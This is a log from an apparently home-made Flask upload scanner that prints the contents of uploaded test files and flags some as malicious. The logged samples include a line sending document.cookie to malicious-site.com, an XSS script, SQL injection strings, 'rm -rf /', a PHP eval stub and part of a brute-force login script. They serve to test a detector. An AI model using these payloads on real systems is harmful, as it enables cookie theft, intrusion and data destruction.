2025-02-22 21:07:43,374 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:07:43,376 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 21:07:43,380 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:07:43,383 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:07:43,386 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:07:43,387 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:07:43,389 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:07:43,390 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 21:07:43,391 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:07:43,392 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:07:43,394 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:07:43,395 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:07:43,396 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:07:43,398 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 21:07:43,399 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:07:43,400 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:07:43,402 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:07:43,403 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:07:43,405 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:07:43,406 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 21:07:43,408 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:07:43,409 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:07:43,411 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:07:43,412 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:07:43,414 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:07:43,416 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 21:07:43,418 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:07:43,420 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:07:43,422 - Extracted content from uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:07:43,423 - Extracted content from uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:07:43,429 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 21:07:43,429 - [33mPress CTRL+C to quit[0m
2025-02-22 21:07:44,676 - 127.0.0.1 - - [22/Feb/2025 21:07:44] "GET / HTTP/1.1" 200 -
2025-02-22 21:07:50,043 - Extracted content from uploads/malicious.xlsx: SELECT * FROM users WHERE username = 'admin';
DROP TABLE users;
eval('some malicious code');
2025-02-22 21:07:50,043 - Malicious pattern detected in uploads/malicious.xlsx
2025-02-22 21:07:50,043 - 127.0.0.1 - - [22/Feb/2025 21:07:50] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 21:07:50,052 - 127.0.0.1 - - [22/Feb/2025 21:07:50] "GET / HTTP/1.1" 200 -
2025-02-22 21:07:55,982 - Extracted content from uploads/test.zip: PK     mVZ               test/UT
 ǹg#gǹgux     PK   kVZ        5   	   test/3.pyUT
 sgggux     -/*Q//+,.IP*U-JSWTPPVpIKO-/-VHMK PKt"7   5   PK   VZ        "   
   test/5.txtUT
 gggux     +H,../J,.+(JL342*,O-* PKW؂=$   "   PK   ZVZ        9   
   test/1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   VZ        #   
   test/2.xssUT
 g찹ggux     )N.,(KI-*PHLNMQT״чp PK=`4    #   PK   qVZ        >   
2025-02-22 21:07:55,985 - 127.0.0.1 - - [22/Feb/2025 21:07:55] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 21:07:55,991 - 127.0.0.1 - - [22/Feb/2025 21:07:55] "GET / HTTP/1.1" 200 -
2025-02-22 21:10:03,445 - 127.0.0.1 - - [22/Feb/2025 21:10:03] "GET / HTTP/1.1" 200 -
2025-02-22 21:10:07,634 - Extracted content from uploads/roooeo.zip: PK   8VZ          
   roooeo.txtUT
 gggux     RMk0WjA^][7
[)AXXhfÒ^r~BHȚ7h	Gv~q%ƲG5N#Nvq^l t}&)HL6H^(!yI}#MB-rbT0?Zi>,QliF}&i9!AZjN\ڡVcO)T%0=
i{,_G:s}UՇ돟>yfVAA
7^ኈ#,v}Lr<&+av|ݬzv	lx-9[!!j\ҤB44Սo_PK[X}    PK   8VZ[X}    
               roooeo.txtUT
 gggux     PK      X       
2025-02-22 21:10:07,637 - 127.0.0.1 - - [22/Feb/2025 21:10:07] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 21:10:07,643 - 127.0.0.1 - - [22/Feb/2025 21:10:07] "GET / HTTP/1.1" 200 -
2025-02-22 21:12:52,292 - Extracted content from temp_extracted/flask_file_upload_2/flask_file_upload/create_malicious_xlsx.py: from openpyxl import Workbook

def create_malicious_xlsx(filename):
    # Create a new Workbook
    wb = Workbook()
    
    # Add a sheet
    ws = wb.active
    ws.title = "Malicious Data"
    
    # Add suspicious content
    suspicious_content = [
        "SELECT * FROM users WHERE username = 'admin';",
        "DROP TABLE users;",
        "eval('some malicious code');"
    ]
    
    for index, line in enumerate(suspicious_content, start=1):
        ws[f'A{index}'] = line
    
    # Add susp
2025-02-22 21:12:52,293 - Malicious pattern detected in temp_extracted/flask_file_upload_2/flask_file_upload/create_malicious_xlsx.py
2025-02-22 21:12:52,293 - Malicious file detected in ZIP: temp_extracted/flask_file_upload_2/flask_file_upload/create_malicious_xlsx.py
2025-02-22 21:12:52,293 - Moved flask_file_upload_2.zip to trash due to suspicious content.
2025-02-22 21:12:52,295 - Extracted content from temp_extracted/roooeo/roooeo.txt: username=admin' OR '1'='1'; -- 
password=secret




exec('rm -rf /');  # Dangerous command to delete files
system('ls -la');  # Command to list files



<?php
$payload = "exec('malicious_code_here')";
eval($payload);  // This executes the code contained in $payload
?>



<?php
$payload = "exec('malicious_code_here')";
eval($payload);  // This executes the code contained in $payload
?>



import requests

url = "http://example.com/login"
usernames = ["admin", "user"]
passwords = ["password", "123
2025-02-22 21:12:52,295 - Malicious pattern detected in temp_extracted/roooeo/roooeo.txt
2025-02-22 21:12:52,296 - Malicious file detected in ZIP: temp_extracted/roooeo/roooeo.txt
2025-02-22 21:12:52,296 - Moved roooeo.zip to trash due to suspicious content.
2025-02-22 21:12:52,315 - Extracted content from temp_extracted/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import zipfile
import json
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(filepath):
    # Placeholder function to extract metadata
    return {"metadata": "Sample metadata"}

def extract_docx_metadata(filepath):
    try:
        doc = Document(filepath)
        core_props = doc.core_properties
        metadata = {
            "author": core_props.author,
            "title": core_props
2025-02-22 21:12:52,317 - Extracted content from temp_extracted/flask_file_upload/flask_file_upload/app.py: from flask import Flask, render_template, request, redirect, url_for, flash
import os
import sqlite3
import re
import logging
import zipfile

app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = 'uploads'
app.config['TRASH_FOLDER'] = 'trash'
app.config['ALLOWED_EXTENSIONS'] = {"docx", "xls", "pdf", "ppt", "odt", "txt", "py", "js", "c", "java", "zip", "r", "bsv", "yaml", "xml", "word", "xl", "xss", "sql", "php"}
app.secret_key = "supersecretkey"

# Ensure directories exist
os.makedirs(app.config['
2025-02-22 21:12:52,317 - Malicious pattern detected in temp_extracted/flask_file_upload/flask_file_upload/app.py
2025-02-22 21:12:52,317 - Malicious file detected in ZIP: temp_extracted/flask_file_upload/flask_file_upload/app.py
2025-02-22 21:12:52,317 - Moved flask_file_upload.zip to trash due to suspicious content.
2025-02-22 21:12:52,319 - Extracted content from temp_extracted/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 21:12:52,320 - Malicious pattern detected in temp_extracted/test/test/3.py
2025-02-22 21:12:52,320 - Malicious file detected in ZIP: temp_extracted/test/test/3.py
2025-02-22 21:12:52,320 - Moved test.zip to trash due to suspicious content.
2025-02-22 21:12:52,321 - Extracted content from temp_extracted/1/1.sql: SELECT * FROM users WHERE username = 'admin' OR '1'='1';

2025-02-22 21:12:52,321 - Malicious pattern detected in temp_extracted/1/1.sql
2025-02-22 21:12:52,321 - Malicious file detected in ZIP: temp_extracted/1/1.sql
2025-02-22 21:12:52,321 - Moved 1.zip to trash due to suspicious content.
2025-02-22 21:12:52,323 - Extracted content from uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 21:12:52,324 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 21:12:52,326 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 21:12:52,327 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 21:12:52,328 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:12:52,329 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:12:52,330 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:12:52,331 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 21:12:52,333 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:12:52,334 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:12:52,336 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 21:12:52,337 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 21:12:52,338 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 21:12:52,340 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 21:12:52,341 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:12:52,342 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:12:52,343 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:12:52,344 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 21:12:52,346 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:12:52,347 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:12:52,348 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 21:12:52,349 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 21:12:52,350 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 21:12:52,352 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 21:12:52,353 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:12:52,354 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:12:52,355 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:12:52,356 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 21:12:52,358 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:12:52,359 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:12:52,360 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:12:52,361 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:12:52,363 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:12:52,364 - Extracted content from temp_extracted/1/1.sql: SELECT * FROM users WHERE username = 'admin' OR '1'='1';

2025-02-22 21:12:52,364 - Malicious pattern detected in temp_extracted/1/1.sql
2025-02-22 21:12:52,364 - Malicious file detected in ZIP: temp_extracted/1/1.sql
2025-02-22 21:12:52,365 - Moved 1.zip to trash due to suspicious content.
2025-02-22 21:12:52,366 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:12:52,367 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:12:52,368 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:12:52,369 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:12:52,370 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:12:52,371 - Extracted content from temp_extracted/1/1.sql: SELECT * FROM users WHERE username = 'admin' OR '1'='1';

2025-02-22 21:12:52,371 - Malicious pattern detected in temp_extracted/1/1.sql
2025-02-22 21:12:52,371 - Malicious file detected in ZIP: temp_extracted/1/1.sql
2025-02-22 21:12:52,371 - Moved 1.zip to trash due to suspicious content.
2025-02-22 21:12:52,372 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:12:52,374 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:12:52,375 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:12:52,376 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:12:52,377 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:12:52,378 - Extracted content from temp_extracted/1/1.sql: SELECT * FROM users WHERE username = 'admin' OR '1'='1';

2025-02-22 21:12:52,378 - Malicious pattern detected in temp_extracted/1/1.sql
2025-02-22 21:12:52,378 - Malicious file detected in ZIP: temp_extracted/1/1.sql
2025-02-22 21:12:52,378 - Moved 1.zip to trash due to suspicious content.
2025-02-22 21:12:52,379 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:12:52,380 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:12:52,381 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 21:12:52,383 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 21:12:52,384 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
